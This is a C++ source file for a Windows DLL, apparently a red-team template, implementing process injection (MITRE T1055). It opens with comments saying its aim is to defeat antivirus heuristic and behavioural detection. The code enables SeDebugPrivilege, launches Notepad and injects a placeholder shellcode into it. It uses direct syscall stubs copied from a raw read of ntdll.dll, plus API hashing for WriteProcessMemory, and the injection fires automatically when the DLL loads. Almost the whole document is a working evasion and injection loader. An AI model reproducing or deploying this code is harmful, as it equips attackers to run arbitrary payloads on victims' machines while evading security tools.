/**
Author: Thomas X Meng
T1055 Process Injection
Sifu syscall Process Injection code. 
**/
/***
 * To break both the heuristic and behavioural detection of AVs, we can use the following techniques:
 * To load the VirtualAlloc and CreateRemoteThread and CloseHandle functions using dynamic syscall stubs
 * but load the WriteProcessMemory using API hashing, thus bypassing the heuristic detection of AVs that detecting 
 * both techniques (dynamic syscall stubs and API hashing) at the same time. To satisfy the conventional PE injection rules,
 *  The three stages of PE injection need to be observed in sequence.  
 * Sub-techniques: Devide and conquer, reference: 
 * https://gist.github.com/theevilbit/073ca4eb15383eb3254272fc24632efd
*/
#include <stdint.h> // For C++
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstring>
#pragma comment(lib, "ntdll")
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif


typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
const int SYSCALL_STUB_SIZE = 23; // How arch depend are syscall stubs? 

// Define function pointers for the dynamic syscalls
using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);

// Define prototype for the API hashing function
using customWriteProcessMemory = BOOL(WINAPI*)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
);


PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL GetSyscallStub(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
	BOOL stubFound = FALSE; 

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
            printf("[+] Address of %s in manual loaded ntdll export table: %p\n", functionName, (void*)functionVA);
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			stubFound = TRUE;
			printf("[+] Syscall stub for %s found.\n", functionName);
            // Print the syscall stub bytes
            printf("[+] Syscall stub bytes: ");
            for (int i = 0; i < SYSCALL_STUB_SIZE; i++) {
                printf("%02X ", ((unsigned char*)syscallStub)[i]);
            }
            printf("\n");
			break;
		}
	}

	if (!stubFound) {
		printf("[-] Syscall stub for %s not found.\n", functionName);
	}
	return stubFound;
}


BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
    wprintf(L" [+] Enable %ls adequate privilege\n", Privilege);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(L" [+] Success\n");
    else
        wprintf(L" [-] Failure\n");

    return ret;
}

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

class CityHash {
public:
    uint64_t CityHash64(const char *buf, size_t len) {
        if (len <= 32) {
            if (len <= 16) {
                return HashLen0to16(buf, len);
            } else {
                return HashLen17to32(buf, len);
            }
        } else if (len <= 64) {
            return HashLen33to64(buf, len);
        }

        // For strings over 64 characters, CityHash uses a more complex algorithm
        // which is too lengthy to implement here. The official CityHash
        // implementation should be used for such cases.

        // Simplified version for longer strings:
        uint64_t hash = 0;
        for (size_t i = 0; i < len; ++i) {
            hash = hash * 33 + buf[i];
        }
        return hash;
    }

private:
    uint64_t HashLen0to16(const char* s, size_t len) {
        // Simplified hashing for short strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 33 + s[i];
        }
        return (a << 1) ^ b;
    }

    uint64_t HashLen17to32(const char* s, size_t len) {
        // Simplified hashing for medium strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 29 + s[i];
        }
        return (a << 2) ^ b;
    }

    uint64_t HashLen33to64(const char* s, size_t len) {
        // Simplified hashing for larger strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 37 + s[i];
            b = b * 39 + s[i];
        }
        return (a << 3) ^ b;
    }
};

CityHash cityHasher;

uint64_t getHashFromString(const char *string) {
    size_t stringLength = strnlen_s(string, 50);
    // Using CityHash to compute the hash
    return cityHasher.CityHash64(string, stringLength);
}

// class SimpleMurmurHash3 {
// public:
//     uint32_t computeHash32(const char* data, size_t len, uint32_t seed = 0) {
//         uint32_t hash = seed;
//         const uint32_t c1 = 0xcc9e2d51;
//         const uint32_t c2 = 0x1b873593;

//         const int nblocks = len / 4;
//         const uint32_t* blocks = (const uint32_t*)(data);
//         for (int i = 0; i < nblocks; i++) {
//             uint32_t k = blocks[i];
//             k *= c1;
//             k = rotl32(k, 15);
//             k *= c2;
            
//             hash ^= k;
//             hash = rotl32(hash, 13); 
//             hash = hash * 5 + 0xe6546b64;
//         }

//         const uint8_t* tail = (const uint8_t*)(data + nblocks * 4);
//         uint32_t k1 = 0;
//         switch (len & 3) {
//             case 3: k1 ^= tail[2] << 16;
//             case 2: k1 ^= tail[1] << 8;
//             case 1: k1 ^= tail[0];
//                     k1 *= c1; k1 = rotl32(k1, 15); k1 *= c2; hash ^= k1;
//         };

//         hash ^= len;
//         hash = fmix32(hash);

//         return hash;
//     }

// private:
//     static uint32_t rotl32(uint32_t x, int8_t r) {
//         return (x << r) | (x >> (32 - r));
//     }

//     static uint32_t fmix32(uint32_t h) {
//         h ^= h >> 16;
//         h *= 0x85ebca6b;
//         h ^= h >> 13;
//         h *= 0xc2b2ae35;
//         h ^= h >> 16;
//         return h;
//     }
// };


// SimpleMurmurHash3 hasher;
// DWORD getHashFromString(const char *string) {
//     size_t stringLength = strnlen_s(string, 50);
//     return hasher.computeHash32(string, stringLength);
// }

// DWORD getHashFromString(char *string)
// {
//     size_t stringLength = strnlen_s(string, 50);
//     DWORD hash = 0x35;

//     for (size_t i = 0; i < stringLength; i++)
//     {
//         hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
//     }
//     // printf("%s: 0x00%x\n", string, hash);

//     return hash;
// }

// FNV-1a hash: This implementation uses a variant of the FNV-1a hash algorithm, 
//which is known for its simplicity and relatively good distribution properties. 
//The constants 0x811c9dc5 and 0x1000193 are parameters of the FNV-1a algorithm.

//This hash function is straightforward, yet it should provide a better balance between simplicity and effectiveness

//32-bit FNV-1a hash
// Improve the distribution and collision resistance of the hash values
// class ImprovedHash {
// public:
//     uint32_t computeHash(const char* input, size_t length) {
//         uint32_t hash = 0x811c9dc5;
//         uint32_t prime = 0x1000193;

//         for (size_t i = 0; i < length; ++i) {
//             uint8_t value = input[i];
//             hash ^= value;
//             hash *= prime;
//         }

//         // Finalization step to improve distribution
//         hash ^= hash >> 16;
//         hash *= 0x85ebca6b;
//         hash ^= hash >> 13;
//         hash *= 0xc2b2ae35;
//         hash ^= hash >> 16;

//         return hash;
//     }
// };

//64-bit FNV-1a hash
// class ImprovedHash {
// public:
//     uint64_t computeHash(const char* input, size_t length) {
//         uint64_t hash = 0xcbf29ce484222325; // 64-bit initial value, FNV_offset_basis
//         uint64_t prime = 0x100000001b3;     // 64-bit prime, FNV_prime value

//         for (size_t i = 0; i < length; ++i) {
//             uint8_t value = input[i];
//             hash ^= value;
//             hash *= prime;
//         }

//         // Finalization steps
//         hash ^= hash >> 33;
//         hash *= 0xff51afd7ed558ccd;
//         hash ^= hash >> 33;
//         hash *= 0xc4ceb9fe1a85ec53;
//         hash ^= hash >> 33;

//         return hash;
//     }
// };

// // Replace the original getHashFromString with this new implementation
// ImprovedHash hasher;
// // DWORD getHashFromString(char *string) {
// DWORD getHashFromString(const char *string) {
//     size_t stringLength = strnlen_s(string, 50);
//     return hasher.computeHash(string, stringLength);
// }

PDWORD getFunctionAddressByHash(char *library, DWORD hash)
{
	PDWORD functionAddress = (PDWORD)0;

	// Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)
	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
	
	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
	
	// Get RVAs to exported function related information
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	// Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
	// If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		// Calculate hash for this exported function
		DWORD functionNameHash = getHashFromString(functionName);
		
		// If hash for API function is found, resolve the function address
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			printf("[*] function name:%s hash: 0x%x RVA: %p\n", functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
	}
}


extern "C" __declspec(dllexport) void CALLBACK ExecuteMagiccode(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

void CALLBACK ExecuteMagiccode(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {

    unsigned char magiccode[] = ####SHELLCODE####;


    // pop a message box indicate start of this function:
    MessageBoxA(NULL, "Sifu syscall is called!", "Information", MB_OK | MB_ICONINFORMATION);
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        printf("[-] Failed to load kernel32.dll.\n");
        exit(EXIT_FAILURE);
    }

    // Load ntdll.dll and retrieve its handle
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to load ntdll.dll.\n");
        exit(EXIT_FAILURE);
    }

    PFN_GETLASTERROR pGetLastError = (PFN_GETLASTERROR)GetProcAddress(hKernel32, "GetLastError");

    if (!EnableWindowsPrivilege(L"SeDebugPrivilege")) {
        printf("[-]Failed to enable SeDebugPrivilege. You might not have sufficient permissions.\n");
        exit(EXIT_FAILURE);
    }

    // Target process information:
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    PVOID remoteBuffer = NULL; // Pointer to remoteBuffer



 
////////////////////////////////////////////////////////



    // Determine the correct Notepad path based on system architecture
    if (IsSystem64Bit()) {
        strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
    } else {
        strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
    }

    // Attempt to create a process with Notepad
    BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (!success) {
        MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
        exit(EXIT_FAILURE); // Exit the program
    }
    pid = pi.dwProcessId;



//////////////////////////////////////////





    Sleep(1000);
    printf("[*]target process PID: %d\n", pid);

     // Get the handle to the default loaded ntdll.dll in the process
    HMODULE hNtdllDefault = GetModuleHandleA("ntdll.dll");
    if (hNtdllDefault == NULL) {
        printf("[-] Failed to get handle of the default loaded ntdll.dll.\n");
        exit(EXIT_FAILURE);
    } else {
        printf("[+] Memory address of the default loaded ntdll.dll: %p\n", hNtdllDefault);
    }

	char syscallStub[SYSCALL_STUB_SIZE] = {}; //need once, instead of having multiple locations we can reuse this stub for every function.
	SIZE_T bytesWritten = 0;
	DWORD oldProtection = 0; //need once. 
	HANDLE file = NULL;
	DWORD fileSize = 0;  
	DWORD bytesRead = 0;  
	LPVOID fileData = NULL;
	
	OBJECT_ATTRIBUTES oa;
	HANDLE fileHandle = NULL;
	NTSTATUS status = 0;  
	IO_STATUS_BLOCK osb;
	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));

    // This part should be only called once to load the info of ntdll.dll. 
	file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	ReadFile(file, fileData, fileSize, &bytesRead, NULL);
    printf("[+] Memory location of loaded ntdll.dll: %p\n", fileData);


	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;
    // This part should be only called once to load the info of ntdll.dll. 

    bool rdataSectionFound = false;

    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++) 
    {
        if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) { 
            rdataSection = section;
            printf("[+] .rdata section found.\n");
            rdataSectionFound = true;
            break;
        }
        section++;
    }

    if (!rdataSectionFound) {
        printf("[-] .rdata section not found.\n");
    }

	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

    ///*********************************************************************************
    // open process:

    myNtOpenProcess NtOpenProcess = (myNtOpenProcess)(LPVOID)syscallStub;
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
    // Open the target process
    HANDLE processHandle;
    CLIENT_ID clientId = { reinterpret_cast<HANDLE>(pid), nullptr };
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, nullptr, 0, nullptr, nullptr);

	if (GetSyscallStub("NtOpenProcess", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
        printf("[+] Memory location of NtOpenProcess syscall stub outwith EAT: %p\n", (void*)NtOpenProcess);

        NTSTATUS status = NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
        if (status != STATUS_SUCCESS) {
            printf("[-] NtOpenProcess failed.\n");
            exit(EXIT_FAILURE);
        }
        printf("[+] NtOpenProcess succeeded.\n");
        /// In 3 fingers death punch, the process handle will vary signifies the different process to strike. 
        printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
    } else {

        printf("[-] Failed to execute NtOpenProcess.\n");
        exit(EXIT_FAILURE);
    }
    // Change the protection of the syscall stub back to its original protection
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    printf("[+] Memory location of NtOpenProcess syscall stub: %p\n", (void*)NtOpenProcess);
    printf("[*] old protection: %d\n", oldProtection);
    
    
    
    ///*********************************************************************************


    // virtual allocate:
    myNtAllocateVirtualMemory NtVirtualAlloc = (myNtAllocateVirtualMemory)(LPVOID)syscallStub;
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // arguments needed for NtAllocateVirtualMemory
    // PVOID remoteBuffer = nullptr;
    SIZE_T magiccodeSize = sizeof(magiccode);

    if (GetSyscallStub("NtAllocateVirtualMemory", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
        printf("[+] Memory location of NtAllocateVirtualMemory syscall stub outwith EAT: %p\n", (void*)NtVirtualAlloc);

        status = NtVirtualAlloc(processHandle, &remoteBuffer, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (status != STATUS_SUCCESS) {
            printf("[-] NtAllocateVirtualMemory failed.\n");
            exit(EXIT_FAILURE);
        }
        printf("[+] NtAllocateVirtualMemory succeeded.\n");
        printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
    } else {
        printf("[-] Failed to execute NtAllocateVirtualMemory.\n");
        exit(EXIT_FAILURE);
    }

    // Change the protection of the syscall stub back to its original protection
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    printf("[*] old protection: %d\n", oldProtection);



    
    ///*********************************************************************************

    /// this step can also be devided from the previous calls.
    // virtual memory write:


    DWORD hashWriteProcessMemory = getHashFromString("WriteProcessMemory");
    printf("[*]Hash of WriteProcessMemory: 0x%lx\n", hashWriteProcessMemory);

    customWriteProcessMemory WriteProcessMemory = (customWriteProcessMemory)getFunctionAddressByHash((char *)"kernel32.dll", hashWriteProcessMemory);

    ULONG bytesWrittens = 0;
    // Write the magiccode to the allocated memory
    if (!WriteProcessMemory(processHandle, remoteBuffer, magiccode, sizeof(magiccode), NULL))
    {
        printf("[-]Error writing to process memory.\n");
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
    } else {
        printf("[+]Successfully wrote magiccode to the allocated memory.\n");
    }
    

    ///*********************************************************************************
    ///// As a proof-of-concept, we can run the create remote thread from a seperate process
    /// from the other API functions called to get the addresses of remoteBuffer
    /// as remoteBuffer is the only argument that is needed for NtCreateThreadEx from previous API calls.
    /// We also need to get a new process handle. 
    // create remote thread:
    // Additional function for step == 3
    // if (step == 3) {
    //     // Open the process with the PID passed by the command line argument
    //     processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    //     if (processHandle == NULL) {
    //         printf("[-] Failed to open the process with PID: %lu.\n", pid);
    //         return -1; // or appropriate error handling
    //     }
    //     printf("[+] Process with PID %lu opened.\n", pid);
    // }


    HANDLE threadHandle;

    myNtCreateThreadEx NtCreateThread = (myNtCreateThreadEx)(LPVOID)syscallStub;
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // arguments needed for NtAllocateVirtualMemory
    // HANDLE threadHandle;

    // getchar();
    if (GetSyscallStub("NtCreateThreadEx", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
        printf("[+] Memory location of NtCreateThreadEx syscall stub outwith EAT: %p\n", (void*)NtCreateThread);
        status = NtCreateThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, processHandle, reinterpret_cast<PVOID>(remoteBuffer), nullptr, FALSE, 0, 0, 0, nullptr);
        if (status != STATUS_SUCCESS) {
            printf("[-] NtCreateThreadEx failed.\n");
        }
        printf("[+] NtCreateThreadEx succeeded.\n");
        printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
    } else {
        printf("[-] Failed to execute NtCreateThreadEx.\n");
    }

    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    WaitForSingleObject(threadHandle, INFINITE);
    
    ///*********************************************************************************



    // close handle:
    myNtClose NtCloseHandle = (myNtClose)(LPVOID)syscallStub;
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);


    if (GetSyscallStub("NtClose", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
        printf("[+] Memory location of NtClose syscall stub outwith EAT: %p\n", (void*)NtCloseHandle);
        status = NtCloseHandle(threadHandle);
        if (status != STATUS_SUCCESS) {
            printf("[-] NtCreateThreadEx failed.\n");
        }
        printf("[+] NtClose succeeded.\n");
        printf("[+] thread handle: %IX\n", (SIZE_T)threadHandle);
    } else {
        printf("[-] Failed to execute NtClose.\n");
    }
    

    // Change the protection of the syscall stub back to its original protection
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    printf("[+] Successful!");
    Sleep(155000);
    CloseHandle(processHandle);




}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Optionally automatically execute upon loading the DLL.
        ExecuteMagiccode(NULL, hModule, NULL, SW_SHOW);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}